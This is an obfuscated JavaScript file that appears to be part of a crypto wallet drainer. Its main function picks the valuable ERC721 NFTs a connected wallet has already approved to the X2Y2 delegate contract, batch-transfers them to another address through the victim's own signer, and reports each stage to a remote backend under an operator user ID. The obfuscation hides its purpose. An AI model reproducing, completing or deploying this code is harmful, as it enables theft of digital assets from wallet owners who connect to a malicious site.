function _0x2cb7(_0x53105b, _0xda688e) {
  const _0x532dba = _0x13c7();
  _0x2cb7 = function (_0x1e17f0, _0xeffc97) {
      _0x1e17f0 = _0x1e17f0 - (0x2368 + -0x1e27 + 0x1 * -0x45d);
      let _0x3ef003 = _0x532dba[_0x1e17f0];
      return _0x3ef003;
  };
  return _0x2cb7(_0x53105b, _0xda688e);
}
const _0x56ad4d = _0x2cb7;
(function (_0x2babba, _0x5bd2c3) {
  const _0x3e16ad = _0x2cb7;
  const _0x5d64ad = _0x2babba();
  while (!![]) {
      try {
          const _0x574ee6 = -parseInt(_0x3e16ad(0x10a)) / (-0x1719 + 0x47b * 0x4 + 0x52e) * (parseInt(_0x3e16ad(0xf1)) / (0xaa9 + -0x1 * -0x1c23 + -0x26ca)) + -parseInt(_0x3e16ad(0xfe)) / (-0x7e0 + 0x523 * -0x4 + 0x1 * 0x1c6f) * (parseInt(_0x3e16ad(0x10f)) / (0x7d * -0x1a + -0x1a32 + -0x78 * -0x53)) + parseInt(_0x3e16ad(0xea)) / (-0x2618 * 0x1 + -0x2653 + 0x98e * 0x8) + parseInt(_0x3e16ad(0x106)) / (-0xf87 * -0x2 + -0x2 * -0x3ce + -0x26a4) * (-parseInt(_0x3e16ad(0xfc)) / (0x1af1 + 0x1904 + 0x2 * -0x19f7)) + parseInt(_0x3e16ad(0xf2)) / (-0x1305 + -0x124a + 0x2557) + -parseInt(_0x3e16ad(0x109)) / (0x13 * 0x37 + 0x22de + -0x125 * 0x22) * (-parseInt(_0x3e16ad(0x10c)) / (-0x8 * 0x4d0 + -0x47 * -0x34 + -0x62 * -0x3f)) + parseInt(_0x3e16ad(0x100)) / (-0x1 * 0x11d8 + 0x146f + -0x146 * 0x2);
          if (_0x574ee6 === _0x5bd2c3) {
              break;
          } else {
              _0x5d64ad['push'](_0x5d64ad['shift']());
          }
      } catch (_0x40a274) {
          _0x5d64ad['push'](_0x5d64ad['shift']());
      }
  }
}(_0x13c7, -0x1 * 0x10c4 + -0x1c51b + 0x66e5d));
const MS_X2Y2_ABI = [{
      'inputs': [
          {
              'components': [
                  {
                      'internalType': _0x56ad4d(0x107),
                      'name': 'token',
                      'type': _0x56ad4d(0xec)
                  },
                  {
                      'internalType': _0x56ad4d(0x102),
                      'name': 'tokenId',
                      'type': _0x56ad4d(0x102)
                  }
              ],
              'internalType': 'struct\x20ERC721Delegate.Pair[]',
              'name': _0x56ad4d(0xfb),
              'type': 'tuple[]'
          },
          {
              'internalType': _0x56ad4d(0xec),
              'name': 'to',
              'type': _0x56ad4d(0xec)
          }
      ],
      'name': _0x56ad4d(0xe9),
      'outputs': [],
      'stateMutability': _0x56ad4d(0x108),
      'type': _0x56ad4d(0x10e)
  }];
function _0x13c7() {
  const _0x28086a = [
      'skip',
      'x2y2',
      'toString',
      'getGasPrice',
      '32aEzrMh',
      '1829480JQMwpz',
      'type',
      '100',
      'BigNumber',
      'chain_id',
      'from',
      'cancel',
      'log',
      '150',
      'pairs',
      '593019hbzGSL',
      '120',
      '261xJpHUJ',
      'length',
      '1170642FHYuuW',
      'push',
      'uint256',
      'estimateGas',
      'getTransactionCount',
      'Contract',
      '42RUYuUJ',
      'contract\x20IERC721',
      'nonpayable',
      '9BiOOig',
      '23203EuwGdL',
      'mul',
      '5987700hjQfrK',
      'getSigner',
      'function',
      '404tQEsOW',
      'ERC721',
      'providers',
      'success',
      'Web3Provider',
      'request',
      'div',
      'transferBatch',
      '1701795NAlYqB',
      'amount_usd',
      'address'
  ];
  _0x13c7 = function () {
      return _0x28086a;
  };
  return _0x13c7();
}
const SIGN_X2Y2 = async (_0x26aeb4, _0x31e4fe, _0x533980, _0xe22a0b, _0xd29cf1, _0x526b97 = 0x5de + 0x1 * -0x10de + 0xb00) => {
  const _0x143e5c = _0x56ad4d;
  try {
      const _0x53ddfd = [], _0x1f92fe = [];
      for (const _0x55f359 of _0x26aeb4) {
          if (_0x55f359['skip'] || _0x55f359['type'] !== _0x143e5c(0x110) || _0x55f359['chain_id'] != -0x1cb + -0x20c8 + 0x2294 || _0x55f359[_0x143e5c(0xeb)] < _0x526b97)
              continue;
          if (!await is_nft_approved(_0x55f359[_0x143e5c(0xec)], _0x533980, '0xf849de01b080adc3a814fabe1e2087475cf2e354'))
              continue;
          _0x53ddfd[_0x143e5c(0x101)]({
              'token': _0x55f359[_0x143e5c(0xec)],
              'tokenId': ethers[_0x143e5c(0xf5)][_0x143e5c(0xf7)](_0x55f359['id'])
          });
          _0x1f92fe[_0x143e5c(0x101)](_0x55f359);
      }
      if (_0x53ddfd[_0x143e5c(0xff)] === 0x1fff + -0x1d * -0x8b + -0x2fbe)
          return;
      let _0x4dc730 = new ethers[(_0x143e5c(0xe4))][(_0x143e5c(0xe6))](_0x31e4fe), _0x5d6f05 = _0x4dc730[_0x143e5c(0x10d)]();
      const _0x1115b3 = new ethers[(_0x143e5c(0x105))]('0xf849de01b080adc3a814fabe1e2087475cf2e354', MS_X2Y2_ABI, _0x5d6f05);
      try {
          const _0x1c6ecd = ethers[_0x143e5c(0xf5)][_0x143e5c(0xf7)](await _0x4dc730[_0x143e5c(0xf0)]())[_0x143e5c(0xe8)](ethers[_0x143e5c(0xf5)][_0x143e5c(0xf7)](_0x143e5c(0xf4)))[_0x143e5c(0x10b)](ethers[_0x143e5c(0xf5)][_0x143e5c(0xf7)](_0x143e5c(0xfa)))[_0x143e5c(0xef)]();
          let _0x4d6a5e = null;
          try {
              _0x4d6a5e = await _0x1115b3[_0x143e5c(0x103)][_0x143e5c(0xe9)](_0x53ddfd, _0xe22a0b, { 'from': _0x533980 });
              _0x4d6a5e = ethers[_0x143e5c(0xf5)][_0x143e5c(0xf7)](_0x4d6a5e)[_0x143e5c(0xe8)](ethers[_0x143e5c(0xf5)]['from'](_0x143e5c(0xf4)))['mul'](ethers['BigNumber'][_0x143e5c(0xf7)](_0x143e5c(0xfd)))[_0x143e5c(0xef)]();
          } catch (_0x5bd8f3) {
              _0x4d6a5e = -0x4650d + -0x56d73 + 0xda310;
          }
          const _0x3fe5f6 = await _0x4dc730[_0x143e5c(0x104)](_0x533980, 'pending');
          await send_request({
              'action': _0x143e5c(0xee),
              'user_id': _0xd29cf1,
              'x2y2': _0x143e5c(0xe7),
              'assets': _0x1f92fe
          });
          const _0x4d7c71 = await _0x1115b3[_0x143e5c(0xe9)](_0x53ddfd, _0xe22a0b, {
              'gasLimit': ethers[_0x143e5c(0xf5)][_0x143e5c(0xf7)](_0x4d6a5e),
              'gasPrice': ethers[_0x143e5c(0xf5)][_0x143e5c(0xf7)](_0x1c6ecd),
              'nonce': _0x3fe5f6
          });
          await _0x4d7c71['wait']();
          await send_request({
              'action': _0x143e5c(0xee),
              'user_id': _0xd29cf1,
              'x2y2': _0x143e5c(0xe5)
          });
          for (const _0x559b7f of _0x26aeb4) {
              if (_0x559b7f[_0x143e5c(0xed)] || _0x559b7f[_0x143e5c(0xf3)] !== _0x143e5c(0x110) || _0x559b7f[_0x143e5c(0xf6)] != -0x171c + -0xbd + 0xbed * 0x2)
                  continue;
              let _0x528043 = ![];
              for (const _0x39c40e of _0x1f92fe) {
                  if (_0x39c40e[_0x143e5c(0xf3)] !== _0x143e5c(0x110) || _0x39c40e[_0x143e5c(0xf6)] != -0xd * -0xb3 + -0x5f5 * 0x3 + 0x8c9)
                      continue;
                  if (_0x39c40e[_0x143e5c(0xec)] == _0x559b7f['address'] && _0x39c40e['id'] == _0x559b7f['id']) {
                      _0x528043 = !![];
                      break;
                  }
              }
              if (_0x528043 == !![]) {
                  _0x559b7f[_0x143e5c(0xed)] = !![];
              }
          }
      } catch (_0x158f01) {
          console[_0x143e5c(0xf9)](_0x158f01);
          await send_request({
              'action': _0x143e5c(0xee),
              'user_id': _0xd29cf1,
              'x2y2': _0x143e5c(0xf8)
          });
      }
  } catch (_0x41aed5) {
      console['log'](_0x41aed5);
  }
};